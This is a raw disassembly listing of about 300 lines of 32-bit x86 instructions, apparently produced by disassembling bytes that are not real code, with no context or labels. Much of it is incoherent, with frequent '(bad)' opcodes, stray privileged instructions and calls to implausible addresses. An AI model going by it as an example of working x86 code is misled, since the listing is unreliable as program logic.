  411277:	mov    eax,eax
  411279:	loopne 0x411246
  41127b:	test   ecx,0x19d8484
  411281:	xor    al,BYTE PTR [eax]
  411283:	mov    DWORD PTR [ebp-0x20],eax
  411286:	mov    eax,DWORD PTR [ebp+0x33]
  411289:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  41128f:	ret    
  411290:	add    al,cl
  411292:	dec    ebp
  411293:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  411299:	add    ecx,DWORD PTR ds:0xc7250
  41129f:	inc    ebp
  4112a0:	rcl    DWORD PTR [eax+0x4d],0x5f
  4112a4:	mov    edi,edi
  4112a6:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  4112ac:	jb     0x411275
  4112ae:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4112b5:	mov    esi,DWORD PTR [ebx]
  4112b7:	or     BYTE PTR [edx+0x72b60dcf],cl
  4112bd:	add    eax,DWORD PTR [eax]
  4112bf:	cmp    ecx,eax
  4112c1:	jne    0x41133f
  4112c7:	mov    eax,DWORD PTR [ebp-0x18]
  4112ca:	mov    eax,DWORD PTR [eax]
  4112cc:	xor    eax,edi
  4112ce:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4112d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d8:	mov    ecx,edi
  4112da:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4112e0:	jb     0x4112f1
  4112e2:	add    BYTE PTR [eax-0x3f],bl
  4112e5:	add    BYTE PTR [ebp-0x75],cl
  4112e8:	mov    edi,eax
  4112ea:	xor    eax,DWORD PTR [eax]
  4112ec:	mov    al,bh
  4112ee:	or     eax,0x497284
  4112f3:	xor    al,cl
  4112f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112f8:	mov    ecx,edi
  4112fa:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  411300:	jb     0x411311
  411302:	add    BYTE PTR [eax],bh
  411304:	enter  0x8500,0x8b
  411308:	add    ah,ah
  41130a:	add    BYTE PTR [eax],al
  41130c:	inc    ebp
  41130d:	(bad)  
  41130e:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  411315:	mov    esi,DWORD PTR [edx+0x8]
  411318:	add    bh,cl
  41131a:	dec    ebp
  41131b:	mov    dh,0x8b
  41131d:	add    esi,DWORD PTR [ebx]
  41131f:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  411325:	add    BYTE PTR [eax],al
  411327:	mov    eax,ecx
  411329:	call   0xc7cc137b
  41132e:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d49]
  411335:	mov    eax,DWORD PTR [eax]
  411337:	in     al,dx
  411338:	ror    DWORD PTR [ecx],0x4d
  41133b:	iret   
  41133c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  411343:	xor    dh,BYTE PTR [edx-0x75]
  411346:	add    al,bh
  411348:	enter  0x5009,0xcf
  41134c:	inc    ebp
  41134d:	mov    WORD PTR [ebx-0x75cdccb7],cs
  411353:	or     al,BYTE PTR ds:0xec728b
  411359:	or     DWORD PTR [ebp-0x31],ecx
  41135c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  411363:	cmp    dh,BYTE PTR [edx+0xf]
  411366:	add    ah,dl
  411368:	rol    DWORD PTR [eax],0x4d
  41136b:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  411371:	(bad)  
  411372:	or     eax,0x497284
  411377:	xor    al,cl
  411379:	mov    ecx,DWORD PTR [ebp-0x18]
  41137c:	mov    ecx,DWORD PTR [ecx]
  41137e:	xor    ecx,edi
  411380:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  411387:	xor    cl,al
  411389:	mov    edx,DWORD PTR [eax]
  41138b:	in     al,0x45
  41138d:	or     DWORD PTR [eax-0x31],edx
  411390:	mov    ds:0x8b49ff8c,eax
  411395:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  41139c:	inc    ebp
  41139d:	or     DWORD PTR [ebx],esi
  41139f:	iret   
  4113a0:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144d]
  4113a7:	cmp    dh,BYTE PTR [ebx]
  4113a9:	jge    0x7241443f
  4113af:	mov    eax,DWORD PTR [eax]
  4113b1:	in     al,0xc7
  4113b3:	add    BYTE PTR [ebp-0x39],cl
  4113b6:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b7]
  4113bd:	mov    edx,ecx
  4113bf:	clc    
  4113c0:	test   BYTE PTR [ecx],cl
  4113c2:	std    
  4113c3:	iret   
  4113c4:	dec    DWORD PTR [ebp+eax*2+0x14328b49]
  4113cb:	xor    al,bh
  4113cd:	mov    eax,ebx
  4113cf:	in     al,dx
  4113d0:	enter  0x1109,0xcf
  4113d4:	inc    ebp
  4113d5:	mov    WORD PTR [ebx-0x38cde7b7],cs
  4113db:	or     al,BYTE PTR [ebx+ecx*4+0x932f89d]
  4113e2:	jmp    0x4113b3
  4113e4:	push   0xffffff8c
  4113e6:	dec    DWORD PTR [ebp-0xc]
  4113e9:	xor    al,BYTE PTR [ebp+0x3a]
  4113ec:	push   eax
  4113ed:	jne    0x411409
  4113ef:	mov    edi,edi
  4113f1:	in     al,0x8b
  4113f3:	add    BYTE PTR [eax],cl
  4113f5:	(bad)  
  4113f6:	dec    ebp
  4113f7:	test   BYTE PTR [ebx],dh
  4113f9:	dec    ecx
  4113fa:	add    esi,DWORD PTR [edx]
  4113fc:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  411402:	or     bh,cl
  411404:	(bad)  
  411405:	mov    ebx,es
  411407:	dec    ecx
  411408:	push   0x32
  41140a:	lea    esi,[edx]
  41140c:	xchg   esp,eax
  41140d:	mov    ebp,eax
  41140f:	call   0xd0401e0c
  411414:	inc    ebp
  411415:	mov    WORD PTR [ebx+0x45321849],es
  41141b:	or     bh,bh
  41141d:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  411423:	iret   
  411424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411425:	mov    WORD PTR [ebp+0x4d],es
  411428:	push   eax
  411429:	xor    bl,dh
  41142b:	cmp    bh,bh
  41142d:	jne    0x4113ba
  41142f:	lea    ecx,[eax]
  411431:	lods   al,BYTE PTR ds:[esi]
  411432:	dec    ebp
  411433:	call   0xff450e6b
  411438:	cmp    ecx,DWORD PTR [ebp+0x74]
  41143b:	cmp    ebp,DWORD PTR [edx+0x74]
  41143e:	dec    DWORD PTR [ebx-0x38baf758]
  411444:	add    eax,ebx
  411446:	fadd   DWORD PTR [ebp-0x18]
  411449:	mov    edi,eax
  41144b:	lock inc edi
  41144e:	inc    ebp
  41144f:	test   BYTE PTR [ebx+0x832a89d],cl
  411455:	xor    eax,DWORD PTR [ebp-0x75]
  411458:	add    ecx,DWORD PTR [eax]
  41145a:	sbb    BYTE PTR [ebp+0x45],dl
  41145d:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  411463:	rdpmc  
  411465:	test   DWORD PTR [ebx],0xc18b0fff
  41146b:	or     BYTE PTR [ebp+0x4d],cl
  41146e:	mov    esi,DWORD PTR [ebx]
  411470:	rol    BYTE PTR [ebx],1
  411472:	iret   
  411473:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7463]
  41147a:	cmp    ecx,DWORD PTR [ebp+0xf]
  41147d:	xor    edx,DWORD PTR [edi-0x73]
  411480:	dec    DWORD PTR [eax]
  411482:	mov    esi,DWORD PTR [edx+0x10]
  411485:	add    BYTE PTR [ebp+0x77],al
  411488:	mov    DWORD PTR [eax],ebx
  41148a:	jmp    0x411501
  41148c:	or     DWORD PTR [ebp-0x179b6b64],0xff65f3bf
  411496:	pop    edi
  411497:	inc    ebp
  411498:	pop    ebx
  411499:	mov    eax,edx
  41149b:	loopne 0x41149d
  41149d:	(bad)  
  41149e:	mov    eax,ebx
  4114a0:	push   ecx
  4114a1:	ror    DWORD PTR [ebx+0x4d450813],0x33
  4114a8:	push   esi
  4114a9:	add    edi,DWORD PTR [edi+0x7180850]
  4114af:	inc    ebp
  4114b0:	(bad)  
  4114b1:	push   eax
  4114b2:	popf   
  4114b3:	dec    edi
  4114b4:	xor    bh,bh
  4114b6:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  4114bc:	adc    al,0x89
  4114be:	adc    BYTE PTR [ecx+eax*1],0x75
  4114c2:	add    bh,bh
  4114c4:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  4114cb:	fadd   DWORD PTR [eax]
  4114cd:	call   0xff45075d
  4114d2:	cmp    al,0x45
  4114d4:	dec    ebp
  4114d5:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  4114db:	ret    
  4114dc:	mov    eax,ecx
  4114de:	adc    al,0x11
  4114e0:	add    al,0x0
  4114e2:	add    BYTE PTR [ebp+0x0],dh
  4114e5:	mov    edi,edi
  4114e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e8:	push   eax
  4114e9:	inc    ebp
  4114ea:	add    BYTE PTR [eax-0x2f],dl
  4114ed:	adc    eax,0x8b45ff03
  4114f2:	xor    edx,esp
  4114f4:	add    ecx,DWORD PTR [ebp-0x77]
  4114f7:	add    esp,edi
  4114f9:	mov    eax,DWORD PTR [ebp-0x58]
  4114fc:	inc    DWORD PTR [ebp+0x14]
  4114ff:	mov    DWORD PTR [ebp+0x18],eax
  411502:	push   eax
  411503:	inc    ebp
  411504:	dec    DWORD PTR [ebx-0x388ae7f4]
  41150a:	call   0xfff10fd2
  41150f:	mov    eax,DWORD PTR [ebp+0x8]
  411512:	mov    edx,DWORD PTR [ebp+0x33]
  411515:	xor    eax,DWORD PTR [ebx]
  411517:	lea    edi,[ebx]
  411519:	adc    DWORD PTR [edx+esi*2-0x75],esi
  41151d:	add    BYTE PTR [ecx+eax*8],cl
  411520:	dec    ebp
  411521:	xor    BYTE PTR [ebx],0xfc
  411524:	add    edi,edi
  411526:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  41152a:	mov    eax,ebx
  41152c:	pop    edi
  41152d:	push   es
  41152e:	leave  
  41152f:	or     dl,BYTE PTR [eax]
  411531:	xor    eax,0x7fec2d55
  411536:	in     al,0xec
  411538:	adc    DWORD PTR [edx+0x14],0x5e
  41153c:	xor    eax,0x53149cc9
  411541:	push   ebp
  411542:	dec    esp
  411543:	in     al,dx
  411544:	or     BYTE PTR [ecx+0x57],dl
  411547:	inc    ebp
  411548:	inc    ecx
  411549:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  41154f:	push   esi
  411550:	and    al,0x51
  411552:	mov    edx,0x7be0833
  411557:	jb     0x411553
  411559:	add    BYTE PTR [ebp+0x30132c6],bl
  41155f:	inc    ebp
  411560:	mov    DWORD PTR [ebx+0x8b9424],ecx
  411566:	or     al,0x8b
  411568:	jl     0x4114f5
  41156a:	sbb    al,0x14
  41156c:	dec    ebp
  41156d:	xor    BYTE PTR [ebp+0x1],0x8b
  411571:	add    BYTE PTR [eax+eax*1],ah
  411574:	xor    eax,DWORD PTR [ecx-0x75]
  411577:	mov    esp,DWORD PTR [esp+edx*1]
  41157a:	add    ecx,DWORD PTR [ecx+0xca010f]
  411580:	dec    esp
  411581:	dec    ecx
  411582:	adc    BYTE PTR [edx-0x15],ch
  411585:	push   0x103039
  41158a:	sbb    al,0x70
  41158c:	inc    esp
  41158d:	push   0x10
  41158f:	dec    DWORD PTR [ecx+ecx*4+0x18]
  411593:	mov    eax,edx
  411595:	or     BYTE PTR [edi+eax*8+0x4532c69d],al
  41159c:	mov    DWORD PTR [ebx+0x75681024],ecx
  4115a2:	test   DWORD PTR [ebp+0x530efcf8],ecx
  4115a8:	jge    0x41161f
  4115aa:	xor    edi,edi
  4115ac:	pushf  
  4115ad:	or     BYTE PTR [ebp+0x6c],dh
  4115b0:	push   0xf88b85ff
  4115b5:	or     BYTE PTR [ebp+0xb],dh
  4115b8:	inc    edi
  4115ba:	or     dh,al
  4115bc:	jb     0x411586
  4115be:	call   DWORD PTR [eax]
  4115c0:	mov    DWORD PTR [ebp+0x24],eax
  4115c3:	mov    ebp,ebx
  4115c5:	adc    bh,bh
  4115c7:	(bad)  
  4115c8:	and    al,0xc6
  4115ca:	lea    ebp,[edi+0x1fffc24]
  4115d0:	or     BYTE PTR [esi+0x74],bl
  4115d3:	ret    0x20
  4115d6:	je     0x411563
  4115d8:	sbb    al,0x83
  4115da:	mov    edi,0xe8ecfff8
  4115df:	mov    ecx,0xf81485ff
  4115e4:	je     0x41156f
  4115e6:	pop    esp
  4115e7:	and    al,0x75
  4115e9:	push   esi
  4115ea:	and    al,0x8d
  4115ec:	and    al,0xfd
  4115ee:	inc    BYTE PTR [ebx+ecx*4+0x18]
  4115f2:	and    al,0x7c
  4115f4:	pop    edi
  4115f5:	adc    BYTE PTR [ebx+0x56],bl
  4115f8:	in     eax,0x51
  4115fa:	ret    0x33
  4115fd:	mov    esi,0x187200
  411602:	pushf  
  411603:	inc    BYTE PTR [ecx+0x1614857c]
  411609:	jge    0x4115a7
  41160b:	mov    DWORD PTR [esp],ecx
  41160e:	(bad)  
  41160f:	cmp    DWORD PTR [eax],ebx
  411611:	adc    BYTE PTR [eax],bl
  411613:	push   ss
  411614:	dec    DWORD PTR [edi+edi*8+0x18]
  411618:	adc    al,0xca
  41161a:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  41161e:	into   
  41161f:	scas   eax,DWORD PTR es:[edi]
  411620:	mov    DWORD PTR [eax+edx*2],esp
  411623:	das    
  411624:	inc    ebp
  411625:	jne    0x4115b2
  411627:	and    al,0x8b
  411629:	and    al,0x33
  41162b:	lea    ecx,[eax]
  41162d:	jb     0x411673
  41162f:	xor    ebp,ebx
  411631:	adc    al,bh
  411633:	xor    bh,bh
  411635:	jne    0x41167b
  411637:	sbb    al,0xff
  411639:	.byte 0xe8
  41163a:	inc    esp
  41163b:	pop    esi
  41163c:	pop    ebp
